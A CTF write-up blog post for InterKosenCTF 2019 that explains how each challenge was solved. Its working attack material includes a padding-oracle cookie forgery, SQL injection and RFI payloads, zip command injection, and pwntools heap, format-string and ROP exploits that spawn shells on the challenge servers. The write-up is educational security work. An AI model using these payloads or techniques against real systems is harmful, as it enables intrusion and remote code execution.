---
layout: post
title: "InterKosenCTF writeup"
date: 2019-08-12 15:00
categories: CTF 
---

1st placed at Mashiro(@Emilia)



# Crypto

## Kurukuru Shuffle

It just shuffled flag.

```
encrypted flag : 1m__s4sk_s3np41m1r_836lly_cut3_34799u14}1osenCTF{5sKm
```

This was solved through bruteforce because the number of cases was lower than expected.

```python
with open('encrypted','rb') as f:
    flag = f.read()[:-1]

L = len(flag)

for k in range(L):
    for a in range(L):
        for b in range(L):
            if a == b:
                break
            encrypted = list(flag)
            sp = []
            tp = []
            i = k
            for _ in range(L):
                sp.append((i + a) % L)
                tp.append((i + b) % L)
                i = (i + k) % L
            sp = sp[::-1]
            tp = tp[::-1]
            for ff in range(len(sp)):
                encrypted[sp[ff]], encrypted[tp[ff]] = encrypted[tp[ff]], encrypted[sp[ff]]

            encrypted = "".join(encrypted)
            if encrypted.startswith('KosenCTF{'):
                print(encrypted)
```

**FLAG** : KosenCTF{us4m1m1_m4sk_s3np41_1s_r34lly_cut3_38769915}



## Flag Ticket

This chall is vulnerable to **Oracle Padding**.

Here is vulnerable code:

```python
@api.route("/result")
def result(req, resp):
    if "result" not in req.cookies:
        api.redirect(resp, api.url_for(Check))
        return

    try:
        cipher = unhexlify(req.cookies["result"])
        if len(cipher) < AES.block_size * 2:
            resp.text = "ERROR: cookie should be iv(16) + cipher(16*n)"
            return
        iv, cipher = cipher[: AES.block_size], cipher[AES.block_size :]
        aes = AES.new(key, AES.MODE_CBC, iv) # Here
        data = Padding.unpad(aes.decrypt(cipher), AES.block_size).decode()
        data = json.loads(data)
        resp.html = api.template("result.html", flag=flag, data=data)
    except TypeError:
        resp.text = "ERROR: invalid cookie"
    except UnicodeDecodeError:
        resp.text = "ERROR: unicode decode error"
    except json.JSONDecodeError:
        resp.text = "ERROR: json decode error"
    except ValueError:
        resp.text = "ERROR: padding error"
```

So i make some code for oracle padding.

```python
import requests

xor = lambda x,y:''.join( chr(ord(i)^ord(j)) for i,j in zip(x.decode('hex'),y.decode('hex'))) 
cookie = "94bb7574150e71d703c7c0f620abba6e56e8bfc153cc061755ebe2f253840c863befd262907b7a1f6b8836fec7d411710b4654e435c31f52fe73053bc35c8d32"
url = "http://crypto.kosenctf.com:8000/result"
iv = [""]*3
for rounds in range(0,1):
	for i in range(16):
		for j in range(0,0x100):
			iiv = ''
			for k in iv[rounds]:
				iiv += chr(ord(k)^(i+1))
			tmp_iv = (chr(j) + iiv).rjust(16,'\x00').encode('hex')
			assert len(tmp_iv) == 32
			tmp_cookie = tmp_iv + cookie[32*rounds+32:32*rounds+64]
			cookies = {"result":tmp_cookie}
			r = requests.get(url,cookies=cookies)
			output = r.text
			if 'padding error' not in output:
				iv[rounds] = chr(j^(i+1)) + iv[rounds]
				print iv[rounds].encode('hex')
				break
```

We can get a output `{"is_hit":  false`.

Try to replace false with true.

```python
print xor(xor(xor(cookie[:32],iv[0]).encode('hex'),'{"is_hit":  true'.encode('hex')).encode('hex'),cookie[:32]).encode('hex')
```

**cookie['result']** : 94bb7574150e71d703c7c0b035b5bc6e56e8bfc153cc061755ebe2f253840c863befd262907b7a1f6b8836fec7d411710b4654e435c31f52fe73053bc35c8d32

Change the cookie to we made.

**FLAG** : KosenCTF{padding_orca1e_is_common_sense}



## E_S_P

This chall looks like RSA Challs.

But, we know prefix `Yukko the ESPer: My amazing ESP can help you to get the flag! -----> `

```
N = 11854673881335985163635072085250462726008700043680492953159905880499045049107244300920837378010293967634187346804588819510452454716310449345364124188546434429828696164683059829613371961906369413632824692460386596396440796094037982036847106649198539914928384344336740248673132551761630930934635177708846275801812766262866211038764067901005598991645254669383536667044207899696798812651232711727007656913524974796752223388636251060509176811628992340395409667867485276506854748446486284884567941298744325375140225629065871881284670017042580911891049944582878712176067643299536863795670582466013430445062571854275812914317
e = 5
Wow Yukko the ESPer helps you!
Yukko the ESPer: My amazing ESP can help you to get the flag! -----> the length of the flag = 39
c = 4463634440284027456262787412050107955746015405738173339169842084094411947848024686618605435207920428398544523395749856128886621999609050969517923590260498735658605434612437570340238503179473934990935761387562516430309061482070214173153260521746487974982738771243619694317033056927553253615957773428298050465636465111581387005937843088303377810901324355859871291148445415087062981636966504953157489531400811741347386262410364012023870718810153108997879632008454853198551879739602978644245278315624539189505388294856981934616914835545783613517326663771942178964492093094767168721842335827464550361019195804098479315147

```

I decrypted encrypted message using Stereotyped Messages Attack.

```python
c = 4463634440284027456262787412050107955746015405738173339169842084094411947848024686618605435207920428398544523395749856128886621999609050969517923590260498735658605434612437570340238503179473934990935761387562516430309061482070214173153260521746487974982738771243619694317033056927553253615957773428298050465636465111581387005937843088303377810901324355859871291148445415087062981636966504953157489531400811741347386262410364012023870718810153108997879632008454853198551879739602978644245278315624539189505388294856981934616914835545783613517326663771942178964492093094767168721842335827464550361019195804098479315147
n = 11854673881335985163635072085250462726008700043680492953159905880499045049107244300920837378010293967634187346804588819510452454716310449345364124188546434429828696164683059829613371961906369413632824692460386596396440796094037982036847106649198539914928384344336740248673132551761630930934635177708846275801812766262866211038764067901005598991645254669383536667044207899696798812651232711727007656913524974796752223388636251060509176811628992340395409667867485276506854748446486284884567941298744325375140225629065871881284670017042580911891049944582878712176067643299536863795670582466013430445062571854275812914317
e = 5
known = 42983198277764796429769849778560768556634168265102988738267040585263257346275308818714371333496991474059525021258051487213763741199340195311836730211991606494242875122658745448181510008423679357583966577287602411259972081563162236185696655780004334829694890109L

P.<x> = PolynomialRing(Zmod(n))
f = (known + x)^e - c
roots = f.small_roots(epsilon=1/30)
print roots
print("roots")
for root in roots:
    print known+root
```

roots is `165645493428051547972635989273351968513318730602803338608256193754635776`.

Finally i got a flag as `known+root`

**FLAG** : KosenCTF{H0R1_Yukk0_1s_th3_ESP3r_QUEEN}



## pascal homomorphicity

This chall is based on RSA, but our input is public exponent.

```python
from secrets import flag
from Crypto.Util.number import getStrongPrime

p = getStrongPrime(512)
q = getStrongPrime(512)
n = p * q

key = int.from_bytes(flag, "big")
c = pow(1 + n, key, n * n)
print("I encrypted my secret!!!", flush=True)
print(c, flush=True)

# receive plaintext
print(
    "I encrypt your message ;)",
    flush=True,
)

while True:
    plaintext = input("> ")
    m = int(plaintext)
    
    # check plaintext
    if m.bit_length() < key.bit_length():
        print(
            "[!]Your plaintext is too weak. At least {} bits long plaintext is required.".format(
                key.bit_length()
            ),
            flush=True,'K'
        )
        continue
        
    # encrypt
    c = pow(1 + n, m, n * n)

    # output
    print("Thanks. This is your secret message.", flush=True)
    print(c, flush=True)

```

Hm... after some test, i decide to brute force as difference between correct and fail.

What mean?

We know flag prefix `KosenCTF{blahblah}` and length 48 characters as `383 bits`.

It means if `KosenCTF{00000000000000000000000000000000000000}`'s 10th character `0` is small than real flag, output is small than encrypted flag.

But if 10th character is correct, output becomes more similar encrypted flag.

Yes, i find the `Longest Common Substring`'s length between **encrypted flag** and **encrypted input value.**

Here is my exploit code:

```python
from pwn import *

flag = 'Th15_15_t00_we4k_p41ll1er_crypt05y5tem'

r = remote('crypto.kosenctf.com',8002)

def go(i):
	tmp = int(i.encode('hex'),16)
	r.recvuntil('>')
	r.sendline(str(tmp))
	r.recvuntil('message.\n')
	return r.recvline().replace('\n','')

def lcs(a,b):
	aa = str(a)
	bb = str(b)
	cnt = 0
	for i in range(len(aa)):
		if aa[i]==bb[i]:
			cnt += 1
		else:
			break
	return cnt

r.recvuntil('!!!\n')
encflag = int(r.recvline().replace('\n',''))

import string
charset = string.printable

while 1:
	output = dict()
	print encflag
	for i in charset:
		fake = 'KosenCTF{'+((flag+i).ljust(38,'0'))+'}'
		kk = go(fake)
		c = lcs(encflag,kk)
		if c not in output.keys():
			output[c] = []
		output[c].append(i)

	output = sorted(output.items(),reverse = True)
	for i in output:
		print i[0], i[1]

	flag = raw_input('> ').replace('\n','')
	if flag == 'q':
		break

r.close()
```

**FLAG** : KosenCTF{Th15_15_t00_we4k_p41ll1er_crypt05y5tem}



# Forensics

## Hugtto!

It's steganography challs.

The least bit is set, it means flag's 1 bit is 1.

The opposite case flag's 1 bit is 0.

```python
from PIL import Image
from secret import flag
from datetime import datetime
import tarfile
import sys

import random

random.seed(int(datetime.now().timestamp()))

bin_flag = []
for c in flag:
    for i in range(8):
        bin_flag.append((ord(c) >> i) & 1)

img = Image.open("./emiru.png")
new_img = Image.new("RGB", img.size)

w, h = img.size

i = 0
for x in range(w):
    for y in range(h):
        r, g, b = img.getpixel((x, y))
        rnd = random.randint(0, 2)
        if rnd == 0:
            r = (r & 0xFE) | bin_flag[i % len(bin_flag)]
            new_img.putpixel((x, y), (r, g, b))
        elif rnd == 1:
            g = (g & 0xFE) | bin_flag[i % len(bin_flag)]
            new_img.putpixel((x, y), (r, g, b))
        elif rnd == 2:
            b = (b & 0xFE) | bin_flag[i % len(bin_flag)]
            new_img.putpixel((x, y), (r, g, b))
        i += 1

new_img.save("./steg_emiru.png")
with tarfile.open("stegano.tar.gz", "w:gz") as tar:
    tar.add("./steg_emiru.png")
    tar.add(sys.argv[0])
```

But, it is based on random value with execute time.

So, extract `steg_emiru.png`'s create timestamp, and got a flag.

```python
from PIL import Image
import tarfile
import sys
import random

for iii in range(10):
    random.seed(int(1565059458)-iii)

    img = Image.open("./steg_emiru.png")

    w, h = img.size
    res = ''
    i = 0
    for x in range(2):
        for y in range(h):
            r, g, b = img.getpixel((x, y))
            
            rnd = random.randint(0, 2)
            if rnd == 0:
                res += str(r&1)
            elif rnd == 1:
                res += str(g&1)
            elif rnd == 2:
                res += str(b&1)
            i += 1
    k = ''
    for i in range(int(len(res)/8)):
        k += chr(int(res[i*8:i*8+8][::-1],2))
    if 'Kosen' in k:
        print(iii,k)
        break
```

**FLAG** : KosenCTF{Her_name_is_EMIRU_AISAKI_who_is_appeared_in_Hugtto!PreCure}



## lost world

This chall is recover root's password, then grep dmesg.

I try to method from below link.

https://linuxconfig.org/how-to-reset-lost-root-password-on-ubuntu-16-04-xenial-xerus-linux



**FLAG** : KosenCTF{u_c4n_r3s3t_r00t_p4ssw0rd_1n_VM}



## saferm

`img` contains ELF file and erased file.

First extract ELF file, and analyse that.

It's simple.

First make random 8 bytes from /dev/urandom.

Next, xor file for erasing repeatedly using random 8 bytes.

I expect it is zip, then i got a zip file.

In zip, we got a flag.

**FLAG** : KosenCTF{p00r_shr3dd3r}



## Temple of Time

In pcap, exist time-based sql injection query.

Just parsing query and got a flag.

```python
import urllib
with open('./40142c592afd88a78682234e2d5cada9.pcapng','rb') as f:
	q = f.read()

k = q.split('GET /index.php?portal=')
prev = 1
res = ''
prev_value = 0
for i in k[1:]:
	q = i.split('%23')[0]
	q = urllib.unquote(q)
	now = int(q.split("admin'),")[1].split(',')[0])

	if now != prev:
		print now,prev
		res += chr(prev_value)
		prev = now
	prev_value = int(q.split('))=')[1].split(',SLEEP')[0])
print res
```

**FLAG** : KosenCTF{t1m3_b4s3d_4tt4ck_v31ls_1t}

# Reversing

## basic crackme

It simple crackme reversing.

```python
v6 = [180,247,57,89,234,57,75,107,191,128,61,209,
66,16,228,66,261,88,21,264,171,24,232,205,27,235,
81,30,273,68,81,134,83,72,89,54,266,155,253]
res = ''
for i in range(len(v6)):
    kk = v6[i]-i
    t1 = (kk&0xF0)>>4
    t2 = (kk&0xF)<<4
    k = (t1|t2)
    if k > 0xff:
        k -= 0x100
    elif k<0:
        k += 0x100
    res += chr(k)

print `res`
```

**FLAG** : KosenCTF{w3lc0m3_t0_y0-k0-s0_r3v3rs1ng}



## magic function

It check flag's character functions.

But, 0~7 is `f1`, 8~15 is `f2`, 16~23 is `f3`.

I used to gdb for extract true value.

```python
from pwn import *

def setBreak(addr):
	r.sendline('b*%s'%hex(addr))

def parseReg(data):
	return data.split("('")[1].split("')")[0]

flag = 'KosenCTF{fl4ggy_p0lyn0m}'
for _ in range(0x8):
	r = process(['gdb','chall'])
	tmp_flag = flag.ljust(24,'0')
	#setBreak(0x000000000040080B) # f1
	#setBreak(0x000000000040082B) # f2
	setBreak(0x0000000000400845) # f3
	r.sendline('r %s'%(tmp_flag))
	t = r.recvuntil('RBX')
	for __ in range(_):
		t = r.recvuntil('$')
		r.sendline('c')
		t = r.recvuntil('RBX')
	k = parseReg(t)
	flag += k
	print flag
	r.close()
```

**FLAG** : KosenCTF{fl4ggy_p0lyn0m}



## passcode

It is dotnet reversing problem.

It's very simple.

You can get the flag by typing it in order.

I reused the code to extract the flag.

```c#
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Linq;
using System.Windows.Forms;

public class Program
{
  private List<int> correct_state;
  private List<int> vars;
  private List<int> indices;
  private List<int> state;

  private void reset()
  {
    this.vars = new List<int>()
      {
      1,
      2,
      3,
      4,
      5,
      6,
      7,
      8,
      9
      };
    this.indices = new List<int>();
    this.state = new List<int>();
  }
  private void shuffle()
  {
    int Seed = 0;
    foreach (int num in this.state)
      Seed = Seed * 10 + num;
    Random random = new Random(Seed);
    for (int index1 = 0; index1 < 9; ++index1)
    {
      int index2 = random.Next(9);
      int var = this.vars[index1];
      this.vars[index1] = this.vars[index2];
      this.vars[index2] = var;
    }
  }
  private void push(int index)
    {
    this.indices.Add(index);
    Console.WriteLine(indices[0]);
    this.state.Add(this.vars[index]);
    this.shuffle();
    Console.WriteLine(state[0]);
    string text = "";
    for (int index1 = 0; index1 < this.indices.Count / 3; ++index1)
      text += ((char) (this.indices[index1 * 3] * 64 + this.indices[index1 * 3 + 1] * 8 + this.indices[index1 * 3 + 2])).ToString();
    Console.WriteLine(text);
    Console.WriteLine("Correct!");
  }
  public void Main()
  {
    this.reset();
    this.correct_state = "231947329526721682516992571486892842339532472728294975864291475665969671246186815549145112147349184871155162521147273481838".Select<char, int>((Func<char, int>) (c => (int) c - 48)).ToList<int>();
    Console.WriteLine(this.correct_state[0]);
    for(int i=0;i<this.correct_state.Count;++i){
      int k = this.correct_state[i];
      int tmp = 0;
      for(int j=0;j<this.vars.Count;j++){
        if(k==this.vars[j]){
          tmp=j;
        }
      };
      this.push(tmp);
      Console.WriteLine(tmp);
    }
  }
}
```

**FLAG** : KosenCTF{pr3tty_3asy_r3v3rsing_cha11enge}



## favorites 

Check one byte between flag and input value.

I used to gdb for extract true value like `magic function chall`.

```python
from pwn import *
import string

context.log_level='warn'

def setBreak(addr):
	r.sendline('b*%s'%hex(addr))

def parseReg(data):
	return data.split("RAX")[1].split("0x")[1][:4]
enc = '62d57b27c5d411c45d67a3565f84bd67ad049a64efa694d624340178'
flag = 'Bl00m_1n70_Y0u'
charset = '_B'+string.printable
for _ in range(13,14):
	for i in string.printable:
		r = process(['gdb','favorites'])

		r.sendline('start')
		r.sendline('b*main+188')
		r.recvuntil('$')
		r.recvuntil('$')
		r.recvuntil('$')
		r.sendline('c')
		r.sendline(flag+i)
		t = r.recvuntil('RBX')
		for __ in range(_):
			t = r.recvuntil('$')
			r.sendline('c')
			t = r.recvuntil('RBX')
		t = parseReg(t)
		if t==enc[_*4:_*4+4]:
			flag += i
			print flag
			r.close()
			break
		
		r.close()
```

**FLAG** : KosenCTF{Bl00m_1n70_Y0u}



# Web

## uploader

It have file upload and download functions.

And it support search function, but it is vulnerable to SQL Injection.

```php
// search
if (isset($_GET['search'])) {
    $rows = $db->query("SELECT name FROM files WHERE instr(name, '{$_GET['search']}') ORDER BY id DESC"); // <-- we can sql injection
    foreach ($rows as $row) {
        $files []= $row[0];
    }
}
```

Therefore we can get `secret_file`'s passcode.

**Query** : ?search=') union select passcode from files-- -

get a passcode for secret_file, "the_longer_the_stronger_than_more_complicated".

Next just input passcode "the_longer_the_stronger_than_more_complicated" for downloading secret_file.

Then we got a flag :)

**FLAG** : KosenCTF{y0u_sh0u1d_us3_th3_p1ac3h01d3r}



## Image Extractor

This chall is developed by singtra.

It support source code, but i think that it have not vulnerable code.

But, `zip` is possible to contain symbolic link file.

```ruby
get '/image/:name/:image' do
  if params[:name] !~ /^[a-f0-9]{32}$/ || params[:image] !~ /^[A-Za-z0-9_]+\.[A-Za-z0-9_]+$/
    @err = "Not Found"
    erb :index
  else
    zipfile = File.join("workdir", params[:name] + ".zip")
    filedir = File.join("workdir", SecureRandom.hex(16))
    file = File.join(filedir, params[:image])
    system("unzip -j #{zipfile} word/media/#{params[:image]} -d #{filedir}") # extract file
    if File.exists?(file)
      send_file(file) # read file
    else
      @err = "Not Found"
      erb :index
    end
  end
end
```

So, i make arbitrary docx as symbolic link file `flag.png` linkning  to `/flag`, then upload docx file.

Finally got a flag as access http://URL/flag.png.

**FLAG** : KosenCTF{sym1ink_causes_arbitrary_fi13_read_0ft3n}



## Neko Loader

This chall is support only download function and source code.

Here is code for download:

```php
<?php
if (empty($_POST['ext']) || empty($_POST['name'])) {
    // Missing parameter(s)
    header("HTTP/1.1 404 Not Found");
    print("404 Not Found");
    exit;
} else {
    $ext = strtolower($_POST['ext']);   // Extension
    $name = strtolower($_POST['name']); // Filename
}

if (strlen($ext) > 4) {
    // Invalid extension
    header("HTTP/1.1 500 Internal Server Error");
    print("500 Internal Server Error");
    exit;
}

switch($ext) {
    case 'jpg':
    case 'jpeg': $mime = 'image/jpg'; break;
    case 'png': $mime = 'image/png'; break;
    default: $mime = 'application/force-download';
}

// Download
header('Expires: 0');
header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
header('Cache-Control: private', false);
header('Content-Type: '.$mime);
header('Content-Transfer-Encoding: binary');
include($ext.'/'.$name.'.'.$ext);
?>
```

We can control to ext and name value.

And server allow RFI, it can confirm at **phpinfo.php**.

So i try to ftp schema for RFI.

ext is `ftp:` and name `/[SERVER]/a`.

Finally include's argument is completed as follows:

```
include('ftp://[SERVER]/a.ftp:');
```

**FLAG** : KosenCTF{n3v3r_4ll0w_url_1nclud3}



## E-Sequel-Injection

Oh it is SQL Injection chall.

```php
<?php

if (isset($_GET['source'])) {
    highlight_file(__FILE__);
    exit;
}

$pattern = '/(\s|UNION|OR|=|TRUE|FALSE|>|<|IS|LIKE|BETWEEN|REGEXP|--|#|;|\/|\*|\|)/i';
if (isset($_POST['username']) && isset($_POST['password'])) {

    if (preg_match($pattern, $_POST['username'], $matches)) {
        var_dump($matches);
        exit;
    }
    if (preg_match($pattern, $_POST['password'], $matches)) {
        var_dump($matches);
        exit;
    }

    $pdo = new PDO('mysql:host=e_sequel_db;dbname=e_sequel;charset=utf8;', 'e_sequel', 'e_sequelpassword');
    $pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);
    $stmt = $pdo->prepare("SELECT username from users where username='${_POST['username']}' and password='${_POST['password']}'");
    $stmt->execute();
    $result = $stmt->fetchAll();
    if (count($result) > 0) {
        if ($result[0]['username'] == 'admin') {
            echo include('flag.php');
        } else {
            echo 'Nice login, ' .  $result[0]['username'] . '!';
        }
        exit;
    }
    echo 'Failed to Login';
    exit;
}
```

We can use `quote`, So i try to bypass as follows:

**Query** : username=admin'%26&password='

Then, query return true :)

```
SELECT username from users where username='admin'&' and password='''
```

**FLAG** : KosenCTF{Smash_the_holy_barrier_and_follow_me_in_the_covenant_of_blood_and_blood}



## Image Compressor

In sourecode, we found some code to control `options` at system.

Look this:

```
# man zip
...
-T
--test
Test the integrity of the new zip file. If the check fails, the old zip file is unchanged and (with the -m option) no input files are removed.

-TT cmd
--unzip-command cmd
Use command cmd instead of 'unzip -tqq' to test an archive when the -T option is used.  On Unix, to use a copy of unzip in the current directory instead of the standard system unzip, could use:

zip archive file1 file2 -T -TT "./unzip -tqq"

In cmd, {} is replaced by the name of the temporary archive, otherwise the name of the archive is appended to the end of the command.  The return code is checked for success (0 on Unix).
...
```

So, we can command injeciton using -T, -TT.

**e.g.** zip ./test.zip -T -TT"ls -al /"

**FLAG** : KosenCTF{4rb1tr4ry_c0d3_3x3cut10n_by_unz1p_c0mm4nd}



# Pwnable

## Fastbin Tutorial

It's simple fastbin tutorial problem.

So, i skip detail description for this.

```c
Welcome to Double Free Tutorial!
In this tutorial you will understand how fastbin works.
Fastbin has various security checks to protect the binary
from attackers. But don't worry. You just have to bypass
the double free check in this challenge. No more size checks!
Your goal is to leak the flag which is located at 0x55ece5c0e240.

[+] f = fopen("flag.txt", "r");
[+] flag = malloc(0x50);
[+] fread(flag, 1, 0x50, f);
[+] fclose(f);

This is the initial state:

 ===== Your List =====
   A = (nil)
   B = (nil)
   C = (nil)
 =====================

 +---- fastbin[3] ----+
 | 0x0000000000000000 |
 +--------------------+
           ||
           \/
(end of the linked list)

You can do [1]malloc / [2]free / [3]read / [4]write
```

1. Do not delete malloc_ptr on free
2. A alloc -> A free -> A fd overwrite flag address -> allocation flag address
3. read -> get flag

```python
from pwn import *

t = remote('pwn.kosenctf.com',9001)

l = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')

pp = lambda aa: log.info("%s : 0x%x" % (aa,eval(aa)))

go = lambda w: t.sendlineafter(">",str(w))
go2 = lambda w: t.sendlineafter(":",str(w))
r = lambda z: t.recvuntil(str(z))

r("Your goal is to leak the flag which is located at ")
flag = int(t.recv(14),16)
print hex(flag)

go("1")
go2("A")

go("2")
go2("A")

go("4")
go2("A")
go(p64(flag-0x10))

go("1")
go2("A")
go("1")
go2("A")

go("3")
go2("A")

t.interactive()
```

**FLAG** : KosenCTF{y0ur_n3xt_g0al_is_t0_und3rst4nd_fastbin_corruption_attack_m4yb3}



## Shopkeeper

If you buy some item, then each item's event is executed.

```c
void use(item_t *inventory)
{
  char buf[0x10];

  /* Use the item */
  if (*inventory->name != 0) {

    dputs("* Wanna use it now?");
    printf("[Y/N] > ");
    readline(buf);

    if (*buf == 'Y') {
      (*inventory->event)();
    }

  }
}
```

Here is item list:

```c
* Hello, traveller.
* What would you like to buy?
 $25 - Cinnamon Bun
 $15 - Biscle
 $50 - Manly Bandanna
 $50 - Tough Glove
 $9999 - Hopes
```

If you purchase `Hopes`, then you can get shell.

So, our goal is purchase Hopes :)

```c
gdb-peda$ x/s 0x55555575701c
0x55555575701c:	"Hopes"
gdb-peda$ x/15i 0x0000555555554b16 <- Hopes event
   0x555555554b16 <item_YourGoal>:	push   rbp
   0x555555554b17 <item_YourGoal+1>:	mov    rbp,rsp
   0x555555554b1a <item_YourGoal+4>:	lea    rdi,[rip+0x484]        # 0x555555554fa5
   0x555555554b21 <item_YourGoal+11>:	call   0x5555555549aa <dputs>
   0x555555554b26 <item_YourGoal+16>:	lea    rdi,[rip+0x491]        # 0x555555554fbe
   0x555555554b2d <item_YourGoal+23>:	call   0x5555555549aa <dputs>
   0x555555554b32 <item_YourGoal+28>:	lea    rdi,[rip+0x49a]        # 0x555555554fd3
   0x555555554b39 <item_YourGoal+35>:	call   0x555555554820 <system@plt>
   0x555555554b3e <item_YourGoal+40>:	nop
   0x555555554b3f <item_YourGoal+41>:	pop    rbp
   0x555555554b40 <item_YourGoal+42>:	ret
```

In shop function, we can overwrite money.

```c
void shop(item_t *inventory)
{
  char buf[LEN_NAME];
  item_t *p, *t;
  int money = 100;

  /* Show and ask */
  for(p = item; p != 0; p = p->next) {
    printf(" $%d - %s\n", p->price, p->name);
  }
  printf("> ");
  readline(buf);

  /* Purchase */
  t = purchase(buf);
  if (t == NULL) {

    dputs("* Just looking?");

  } else if (money >= t->price) {

    money -= t->price;
    memcpy(inventory, t, sizeof(item_t));
    dputs("* Thanks for your purchase.");

  } else {

    dputs("* That's not enough money.");

  }
}
```

1. overwrite money > 9999
2. purchase Hopes
3. get shell

```python
from pwn import *

t = remote('pwn.kosenctf.com',9004)
#t = process('./chall')

l = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')

pp = lambda aa: log.info("%s : 0x%x" % (aa,eval(aa)))

go = lambda w: t.sendlineafter(">",str(w))
go2 = lambda w: t.sendlineafter(":",str(w))
r = lambda z: t.recvuntil(str(z))
pause()

go("Hopes" + "\x00"*3 + "a"*51)
go("Y")
t.interactive()

```

**FLAG** : KosenCTF{th4t5_0v3rfl0w_41n7_17?}



## Bullsh

It's simple shell binary, but it doesn't have lots of command.

Here is some code for processing commands.

```c
int __fastcall bullexec(const char *a1)
{
  char *i; // [rsp+18h] [rbp-8h]

  for ( i = (char *)a1; *i; ++i )
  {
    if ( *i == 10 || *i == 32 )
    {
      *i = 0;
      break;
    }
  }
  if ( !strcmp(a1, "ls") )
    return system(a1);
  if ( !strcmp(a1, "exit") )
    exit(0);
  printf(a1); // <- this!!
  return puts(": No such command");
}
```

`printf(a1)` is vulnerable to **format string bug**(fsb).

Its very simple fsb problem,so i try to exploit as follows :

1. `printf@got` overwrite `system`
2. get shell

```python
from pwn import *

t = remote('pwn.kosenctf.com',9003)
#t = process('./chall')

e = ELF('./chall')
l = e.libc

pp = lambda aa: log.info("%s : 0x%x" % (aa,eval(aa)))

go = lambda w: t.sendlineafter("$",str(w))
go2 = lambda w: t.sendlineafter(":",str(w))
r = lambda z: t.recvuntil(str(z))

go("%25$p") # 12
t.recv(1)

libc = int(t.recv(14),16) - l.symbols['__libc_start_main'] -0xe7
print hex(libc)
abc = (libc+l.symbols['system'] & 0xffffffff)
abc2 = abc & 0xffff
abc1 = abc >> 16
if (abc1 > abc2):
    p = "%" + str(abc2) + "c%18$hn" +  "%" + str(abc1-abc2) + "c%19$hn"
    p += "a"*(48-len(p))
    p += p64(e.got['printf']) + p64(e.got['printf']+2)
else :
    p = "%" + str(abc1) + "c%18$hn"+ "%" + str(abc2-abc1) + "c%19$hn"
    p += "a"*(48-len(p))
    p += p64(e.got['printf']+2) + p64(e.got['printf'])

print hex(abc1), hex(abc2)
pause()
go(p)

go("sh\x00")

t.interactive()
```

**FLAG** : KosenCTF{f0rm4t_str1ng_3xpl01t_0n_x64_1s_l4zy}



## Stegorop

This is simple ROP Prob.

It occur overflow to 0x30 bytes, but we can't return **main** or **start**.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  _QWORD *v4; // [rsp+0h] [rbp-80h]
  char buf; // [rsp+10h] [rbp-70h]

  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
  if ( lock )
    _abort(*argv);
  puts("===== Online Steganography Tool =====");
  printf("Input: ", 0LL, argv);
  read(0, &buf, 0x100uLL); <-- this!!!
  stagernography(&buf);
  if ( lock )
    _abort(*v4);
  lock = 1;
  return 0;
}
```

1. `RBP` set `printf@got+0x70`
2. execute `puts(puts_got)` for leaking library base address.
3. return `read(0, &buf, 0x100uLL)` for overwrite `printf@got`
4. `printf@got` overwrite `oneshot gadget` at `read`
5. get shell

```python
from pwn import *

t = remote('pwn.kosenctf.com',9002)
#t = process('./chall')

e = ELF('./chall')
l = e.libc

pp = lambda aa: log.info("%s : 0x%x" % (aa,eval(aa)))

go = lambda w: t.sendafter(":",str(w))
go2 = lambda w: t.sendlineafter(":",str(w))
r = lambda z: t.recvuntil(str(z))
pause()
go("a"*0x70 + p64(e.got['printf']+0x70) + p64(0x00000000004009b3) + p64(e.got['puts']) + p64(e.plt['puts']) + p64(0x00000000004008FE))
t.recvline()

libc = u64(t.recv(6).ljust(8,'\x00')) - l.symbols['puts']
pp('libc')

pause(1)
t.send(p64(libc + 0x4f322))

t.interactive()
```

**FLAG** : KosenCTF{r0p_st4g3r_is_piv0t4l}



## Kitten

This chall is OOB read/write and Tcache poisoning

Here is OOB Read at `feed_kitten`:

```c
int feed_kitten()
{
  int result; // eax
  int v1; // [rsp+Ch] [rbp-4h]

  puts("Which one?");
  list_kittens();
  printf("> ");
  v1 = readint();
  if ( v1 >= count )
    result = puts("There's no such kitten...");
  else
    result = printf("%s: Meow!\n", ptr[v1]); <- this!!!!
  return result;
}
```

Here is OOB Write at `foster`:

```c
int foster()
{
  int result; // eax
  int v1; // [rsp+Ch] [rbp-4h]

  puts("Which one?");
  list_kittens();
  printf("> ");
  v1 = readint();
  if ( v1 >= count )
    return puts("There's no such kitten...");
  --count;
  printf("%s: Meow!\n", ptr[v1]);
  free(ptr[v1]); <-- this!!!
  result = v1;
  ptr[v1] = ptr[count];
  return result;
}
```

In `find_kitten`, we can located arbitrary data as name.

Therefore i make fake chunk for `tcache poisoning` in bss section

```c
int find_kitten()
{
  int v0; // ST0C_4
  int v1; // ebx

  if ( count > 9 )
    return puts("You have too many kittens to take care of.");
  puts("You found a kitten!");
  printf("Name: ");
  v0 = readline(name, 127LL);
  v1 = count;
  ptr[v1] = (char *)malloc(v0);
  strcpy(ptr[count], name);
  return count++ + 1;
}
```

1. Leak library address using `feed_kitten`
2. Free fake chunk in bss section using `foster`
3. Tcache bin's fd overwrite free_hook using `malloc_func`
4. After free, get shell

```python
from pwn import *

t = remote('pwn.kosenctf.com',9005)
#t = process('./chall')

e = ELF('./chall')
l = e.libc

pp = lambda aa: log.info("%s : 0x%x" % (aa,eval(aa)))

go = lambda w: t.sendlineafter(">",str(w))
go2 = lambda w: t.sendlineafter(":",str(w))
r = lambda z: t.recvuntil(str(z))

def add(name):
    go("1")
    go2(str(name))

def show(index):
    go("2")
    go(str(index))

def delete(index):
    go("3")
    go(str(index))

add(p64(e.got['puts']))

show(-16)
t.recv(1)
libc = u64(t.recv(6).ljust(8,'\x00')) - l.symbols['puts']
pp('libc')

add(p64(0x602040) + p64(0)*2 + p64(0x21) + p64(0)*3 + p64(0x10000))
pause()
delete(-16)

add(p64(0)*3  + p64(0x21) + p64(libc+l.symbols['__free_hook']))
add(p64(0))
add(p64(libc+0x4f322))
delete(0)

t.interactive()
```

**FLAG** : KosenCTF{00b_4nd_tc4ch3_p01s0n1ng}
